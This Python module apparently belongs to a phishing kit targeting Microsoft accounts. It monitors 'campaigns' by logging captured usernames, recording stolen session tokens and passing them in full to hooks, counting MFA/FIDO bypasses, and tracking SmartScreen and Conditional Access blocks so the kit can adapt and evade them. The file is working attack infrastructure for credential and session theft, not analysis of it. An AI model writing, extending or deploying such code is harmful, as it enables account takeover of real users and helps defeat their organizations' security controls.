"""
Microsoft Campaign Monitor - Real-time Monitoring System
========================================================

Real-time monitoring specifically for Microsoft campaigns:
- Detection of Microsoft countermeasures (SmartScreen, Conditional Access)
- Success rate monitoring
- MFA/FIDO bypass effectiveness
- Rate limiting detection
- Automatic optimization triggers
"""

import asyncio
import logging
from datetime import datetime
from typing import Dict, Any, Optional
from dataclasses import dataclass

# Import the new Monitoring Engine
from monitoring.engine import MonitoringEngine, MonitoringConfig
from plugins.hook_system import trigger_hook, HookType, HookContext

logger = logging.getLogger("MicrosoftMonitor")

@dataclass
class MicrosoftMetrics:
    """Microsoft campaign metrics"""
    campaign_id: str
    timestamp: datetime
    total_attempts: int = 0
    successful_logins: int = 0
    mfa_challenges: int = 0
    mfa_bypasses: int = 0
    session_extractions: int = 0
    rate_limit_hits: int = 0
    detection_events: int = 0
    smartscreen_blocks: int = 0
    error_count: int = 0

class MicrosoftMonitor:
    """
    Real-time monitoring system for Microsoft campaigns.
    Integrates with the central MonitoringEngine and Global Hook System.
    """
    
    def __init__(self, campaign_id: str, engine: MonitoringEngine = None):
        self.campaign_id = campaign_id
        self.engine = engine or MonitoringEngine(MonitoringConfig(log_file=f"microsoft_campaign_{campaign_id}.log"))
        self.metrics = MicrosoftMetrics(campaign_id=campaign_id, timestamp=datetime.now())
        self.logger = logger
        self._running = False
        
    async def start(self):
        """Start the Microsoft-specific monitor."""
        self._running = True
        self.logger.info(f"Starting Microsoft Monitor for Campaign {self.campaign_id}")
        await self.engine.start()
        
    async def stop(self):
        """Stop the monitor."""
        self._running = False
        await self.engine.stop()

    async def record_attempt(self):
        self.metrics.total_attempts += 1
        self.engine.record_event("visit", {"campaign": "Microsoft", "id": self.campaign_id})

    async def record_login(self, username: str):
        self.metrics.successful_logins += 1
        self.engine.record_event("credential_captured", {"username": username, "platform": "Microsoft"})
        await trigger_hook(HookType.CREDS_CAPTURED, HookContext(data={"username": username, "platform": "Microsoft"}))

    async def record_mfa(self, type: str):
        self.metrics.mfa_challenges += 1
        self.logger.info(f"MFA Challenge detected: {type}")

    async def record_session(self, token: str):
        self.metrics.session_extractions += 1
        self.engine.record_event("token_captured", {"token_preview": token[:10] + "..."})
        await trigger_hook(HookType.SESSION_CAPTURED, HookContext(data={"token": token, "platform": "Microsoft"}))
        
    async def record_detection(self, reason: str):
        self.metrics.detection_events += 1
        if "smartscreen" in reason.lower():
            self.metrics.smartscreen_blocks += 1
        
        self.engine.record_event("bot_blocked", {"reason": reason})
        self.logger.warning(f"Detection Event: {reason}")
        await trigger_hook(HookType.BOT_DETECTED, HookContext(data={"reason": reason, "platform": "Microsoft"}))
